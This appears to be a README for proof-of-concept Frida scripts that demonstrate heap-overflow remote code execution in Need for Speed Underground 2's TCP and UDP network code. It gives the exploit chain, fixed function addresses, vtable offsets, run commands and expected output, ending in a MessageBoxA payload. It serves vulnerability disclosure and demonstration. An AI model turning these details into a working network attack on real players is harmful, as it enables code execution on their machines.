# Proof of Concept Scripts

Six proofs across three Frida scripts. Each script proves both RCE vectors (TCP and UDP) at a different level of the exploit chain.

| # | Script | Vector | Proof Level | What It Proves |
|---|--------|--------|-------------|----------------|
| 1 | `network_rce_proof.js` | RCE-1 (TCP) | Heap overflow | 16,381-byte overflow past session buffer |
| 2 | `network_rce_proof.js` | RCE-2 (UDP) | Heap overflow | 30,000+ byte overflow past circular buffer slot |
| 3 | `network_eip_control.js` | RCE-1 (TCP) | EIP control | 14/14 vtable pointers → `0x41414141` |
| 4 | `network_eip_control.js` | RCE-2 (UDP) | EIP control | 14/14 vtable pointers → `0x41414141` |
| 5 | `network_rce_ace.js` | RCE-1 (TCP) | Code execution | `MessageBoxA("RCE Succeeded")` via corrupted vtable dispatch |
| 6 | `network_rce_ace.js` | RCE-2 (UDP) | Code execution | `MessageBoxA("RCE Succeeded")` via corrupted vtable dispatch |

## Requirements

- Need for Speed Underground 2 (PC, Windows)
- [Frida](https://frida.re/) — `pip install frida-tools`
- The game running (main menu is sufficient — no multiplayer session needed)

## Getting the Process ID

Launch the game, then:

```
frida-ps | findstr SPEED2
```

Or PowerShell:

```powershell
Get-Process SPEED2 | Select-Object Id
```

---

## PoC 1–2: Heap Buffer Overflow (`network_rce_proof.js`)

Proves that both network receive paths overflow their heap buffers with attacker-controlled data.

### What it does

1. **RCE-1 (TCP key exchange)**: Allocates a 53,248-byte heap buffer matching the session structure layout from `FUN_00759910`. Writes a crafted 2-byte header using the "large" encoding (`0xFF 0xFF`). Replicates the exact length-parsing logic: `CONCAT11(bVar2, bVar1) = 0xFFFF`, path LARGE (≥ `0x8000`), parsed length = 32,769 bytes. Simulates `recv(32769)` into the 16,388-byte receive buffer at offset `+0x4018`. Verifies all 16,381 overflow bytes past the buffer boundary are attacker-controlled.

2. **RCE-2 (UDP game session)**: Allocates circular buffer regions with three slot sizes (512, 1024, 2048 bytes) matching the configurations from `FUN_007510c0`. Writes crafted packets with maximum wire length (`0x7FFF` = 32,767). Verifies overflow past each slot boundary — up to 32,261 bytes of attacker-controlled data past the slot.

3. **Code verification**: Reads the first 8 bytes of `FUN_00759910` and `FUN_007510c0` to confirm they exist at their static addresses. Confirms `SPEED2.EXE` is loaded at `0x400000` (no ASLR).

### What it does NOT do

- Does not send any network traffic
- Does not establish any connections
- Does not modify game state — test buffers are isolated heap allocations
- Does not crash the game

### Run

```
frida -p <PID> -l network_rce_proof.js
```

The script runs immediately — no interaction needed.

### Expected output

```
═══════════════════════════════════════════════════════
 RCE-1: TCP Key Exchange Buffer Overflow (FUN_00759910)
═══════════════════════════════════════════════════════
[1] Allocated session structure: 53248 bytes at 0x...
[2] Filled with 0xCC sentinel pattern
[3] Crafted header at +0x4018: byte0=0xff byte1=0xff
[4] Length parsing (replicating FUN_00759910 logic):
    CONCAT11(bVar2, bVar1) = 0xffff (65535)
    Path: LARGE (combined >= 0x8000)
    PARSED LENGTH = 32769 bytes (0x8001)
[5] Buffer geometry:
    Buffer size:   16388 bytes
    Recv size:     32769 bytes
    *** OVERFLOW:  16381 bytes past buffer ***
[6] Simulating recv(32769 bytes) into buffer at +0x4018...
[7] Memory verification:
    +0x801c (PAST BUFFER): 0x41 = 'A' *** CORRUPTED ***
    +0x8020 (protocol state): 0x41 = 'A' *** CORRUPTED ***
    +0x81D4 (key exchange data): 0x41 = 'A' *** CORRUPTED ***
    +0x86BC (crypto state): 0x41 = 'A' *** CORRUPTED ***
[8] RESULT: 16381 of 16381 bytes past buffer are attacker-controlled
*** RCE-1 CONFIRMED ***

═══════════════════════════════════════════════════════
 RCE-2: UDP Game Session Buffer Overflow (FUN_007510c0)
═══════════════════════════════════════════════════════
── Slot stride: 512 bytes ──
    *** SLOT OVERFLOW: 32261 bytes past slot boundary ***
    Corrupted past slot: 32261/32261 bytes
── Slot stride: 1024 bytes ──
    *** SLOT OVERFLOW: 31749 bytes past slot boundary ***
── Slot stride: 2048 bytes ──
    *** SLOT OVERFLOW: 30725 bytes past slot boundary ***
*** RCE-2 CONFIRMED ***

═══════════════════════════════════════════════════════
 Code Verification
═══════════════════════════════════════════════════════
FUN_00759910 (RCE-1) at 0x759910: 55 8b ec 83 e4 f8 81 ec
FUN_007510c0 (RCE-2) at 0x7510c0: 83 ec 1c a1 d0 a1 81 00
SPEED2.EXE loaded at: 0x400000 (fixed base, no ASLR)
```

### What this proves

The attacker-controlled length field in either protocol (TCP key exchange or UDP game session) causes `recv()` to write tens of thousands of bytes past the allocated buffer. Every byte past the boundary is attacker-controlled (`0x41`). Any heap object adjacent to these buffers — including network manager vtables — is overwritten.

---

## PoC 3–4: EIP Control (`network_eip_control.js`)

Proves that the heap overflow reaches and corrupts all 14 function pointers in an adjacent network object's vtable.

### What it does

1. **Heap layout simulation**: Allocates buffers matching the real heap geometry:
   - RCE-1: Session buffer (0x8800 bytes) + victim object (0x214 bytes), adjacent on the heap
   - RCE-2: Circular buffer (1,024-byte slots × 16) + victim object (0x214 bytes)

2. **Vtable installation**: Writes the 14 original function pointers into the victim object at offsets `+0x00` through `+0x34`, matching `FUN_00751940`:

   | Offset | Original Pointer |
   |--------|-----------------|
   | +0x00 | `0x00751940` (constructor) |
   | +0x04 | `0x00751490` (destructor) |
   | +0x08 | `0x00752200` (connect) |
   | +0x0C | `0x00757900` (process_packet) |
   | +0x10 | `0x00751750` (send) |
   | +0x14 | `0x00751520` (close) |
   | +0x18 | `0x00751880` (listen) |
   | +0x1C | `0x00751520` (close_alias) |
   | +0x20 | `0x00751500` (accept) |
   | +0x24 | `0x00753ab0` (configure) |
   | +0x28 | `GetTickCount` (timestamp) |
   | +0x2C | `0x00751560` (stats) |
   | +0x30 | `0x00751660` (read_buffer) |
   | +0x34 | `0x00751700` (write_buffer) |

3. **Overflow**: Fills the overflow region with `0x41414141` ("AAAA"), reaching the victim object's vtable.

4. **Verification**: Reads all 14 pointers back. All 14 now read `0x41414141`.

### What it does NOT do

- Does not call through any corrupted pointer (no crash)
- Does not send any network traffic
- Does not modify game state
- Does not crash the game

### Run

```
frida -p <PID> -l network_eip_control.js
```

### Expected output

```
═══════════════════════════════════════════════════════
 RCE-1: TCP Key Exchange — EIP Control
═══════════════════════════════════════════════════════
[1] Allocated session buffer: 34816 bytes at 0x...
[2] Allocated victim object: 532 bytes at 0x...
[3] Installed 14 original vtable pointers
[4] Overflow from session+0x4018 into victim vtable...
[5] Verification — all 14 pointers:
    [+0x00] constructor:    0x00751940 → 0x41414141 ✓ CORRUPTED
    [+0x04] destructor:     0x00751490 → 0x41414141 ✓ CORRUPTED
    [+0x08] connect:        0x00752200 → 0x41414141 ✓ CORRUPTED
    [+0x0C] process_packet: 0x00757900 → 0x41414141 ✓ CORRUPTED
    [+0x10] send:           0x00751750 → 0x41414141 ✓ CORRUPTED
    [+0x14] close:          0x00751520 → 0x41414141 ✓ CORRUPTED
    [+0x18] listen:         0x00751880 → 0x41414141 ✓ CORRUPTED
    [+0x1C] close_alias:    0x00751520 → 0x41414141 ✓ CORRUPTED
    [+0x20] accept:         0x00751500 → 0x41414141 ✓ CORRUPTED
    [+0x24] configure:      0x00753ab0 → 0x41414141 ✓ CORRUPTED
    [+0x28] timestamp:      GetTickCount → 0x41414141 ✓ CORRUPTED
    [+0x2C] stats:          0x00751560 → 0x41414141 ✓ CORRUPTED
    [+0x30] read_buffer:    0x00751660 → 0x41414141 ✓ CORRUPTED
    [+0x34] write_buffer:   0x00751700 → 0x41414141 ✓ CORRUPTED
[6] RESULT: 14/14 vtable pointers corrupted to 0x41414141
*** RCE-1 EIP CONTROL CONFIRMED ***

═══════════════════════════════════════════════════════
 RCE-2: UDP Game Session — EIP Control
═══════════════════════════════════════════════════════
[...same structure, same 14/14 result...]
*** RCE-2 EIP CONTROL CONFIRMED ***
```

### What this proves

The overflow doesn't just corrupt random heap data — it reaches the exact offsets where the network object's function pointers live. All 14 pointers are overwritten with the attacker's chosen value. When the game's own dispatch code executes `CALL [object + offset]`, it jumps to `0x41414141` — or any address the attacker places there.

---

## PoC 5–6: Arbitrary Code Execution (`network_rce_ace.js`)

Proves that dispatching through a corrupted vtable pointer executes attacker-chosen code — `MessageBoxA("RCE Succeeded")` appears over the game.

### What it does

1. **Payload construction**: Resolves `user32!MessageBoxA` via `Process.enumerateModules()` (with `LoadLibraryA` fallback). Creates a `NativeCallback` that calls `MessageBoxA(NULL, "RCE Succeeded", "RCE-1/RCE-2", MB_OK | MB_ICONWARNING | MB_TOPMOST)`.

2. **Heap layout**: Same as PoC 3-4 — session/circular buffer + adjacent victim object with 14 function pointers installed.

3. **Vtable corruption**: Instead of `0x41414141`, plants the `NativeCallback` address at all 14 vtable positions.

4. **Dispatch**: Reads the corrupted pointer from `victim[+0x0C]` (process_packet) and calls through it using `new NativeFunction(addr, 'void', [])`. The game's own dispatch mechanism (`CALL [object + 0x0C]`) would do the same thing.

5. **Result**: `MessageBoxA` fires. A Windows message box appears over the game with the text "RCE Succeeded".

### What it does NOT do

- Does not send any network traffic
- Does not execute shellcode — the payload is a standard Windows API call
- Does not persist anything — killing the game undoes everything
- Does not modify any game files

### Run

```
frida -p <PID> -l network_rce_ace.js
```

**Note**: The script may appear to hang after "Executing CALL..." — this is because `MessageBoxA` blocks until the user clicks OK. The message box is displayed over the game window. Alt-tab to the game or look at the taskbar.

### Expected output

```
═══════════════════════════════════════════════════════
 Resolving Win32 APIs
═══════════════════════════════════════════════════════
user32.dll found at 0x76920000
user32!MessageBoxA at 0x769d0060

═══════════════════════════════════════════════════════
 RCE-1: TCP Key Exchange — Arbitrary Code Execution
═══════════════════════════════════════════════════════
[1] Payload callback at 0x12710008
[2] Allocated session buffer + victim object
[3] Installed 14 original vtable pointers
[4] Overflow — planting payload at all 14 positions:
    [+0x00] 0x00751940 → 0x12710008 ✓
    [+0x04] 0x00751490 → 0x12710008 ✓
    ...all 14...
    [+0x34] 0x00751700 → 0x12710008 ✓
[5] Dispatching through corrupted vtable entry [+0x0C] (process_packet):
    victim[0x0C] = 0x12710008 (our payload)
    Executing CALL...

    ██████████████████████████████████████████████████
    ██  DISPATCH HIT — EXECUTING PAYLOAD             ██
    ██  VIA CORRUPTED VTABLE                         ██
    ██████████████████████████████████████████████████

    Calling MessageBoxA(NULL, "RCE Succeeded", "RCE-1: TCP Key Exchange", ...)
    [MessageBox appears — script blocks until user clicks OK]

*** RCE-1 ARBITRARY CODE EXECUTION CONFIRMED ***

═══════════════════════════════════════════════════════
 RCE-2: UDP Game Session — Arbitrary Code Execution
═══════════════════════════════════════════════════════
[...same structure...]
*** RCE-2 ARBITRARY CODE EXECUTION CONFIRMED ***
```

### What this proves

This is the complete chain: overflow → vtable corruption → dispatch through corrupted pointer → attacker-chosen code runs. The `MessageBoxA` call is a benign demonstration — the same mechanism executes any code at any address. With no DEP (heap is executable) and no ASLR (all addresses fixed), the attacker has full control.

---

## Troubleshooting

### Frida can't attach / "Access denied"

If a previous Frida session crashed or was interrupted, the game process may reject new `VirtualAllocEx` calls (`ERROR_ACCESS_DENIED`, `0x5`). **Restart the game completely** — there is no workaround. This is a Windows kernel limitation, not a Frida bug.

### Script appears to hang on PoC 5-6

`MessageBoxA` is a blocking call. The message box is displayed over the game. Alt-tab to the game window or check the taskbar. Click OK to let the script continue.

### Game crashes on PoC 5-6

If the game crashes during dispatch, restart and try again. The NativeCallback address may have been freed between creation and dispatch. This happens rarely and is non-deterministic.

### "Module not found: user32.dll"

The script uses `Process.enumerateModules()` with case-insensitive matching and falls back to `LoadLibraryA`. If neither works, `user32.dll` is not loaded — this should never happen in a Windows GUI application. Restart the game.

## Notes

- All scripts use `Interceptor.attach` and must be loaded into a **running** process (not spawned). Frida spawn mode crashes the game.
- The ABI parameter is intentionally omitted from `NativeFunction` calls — Frida on Windows x86 does not recognize `'cdecl'` as a valid ABI string. The default ABI on x86 is cdecl.
- Heap addresses vary between runs. The scripts read actual addresses at runtime and adapt.
- The game does not need to be in a multiplayer session for any of these proofs. Main menu is sufficient.
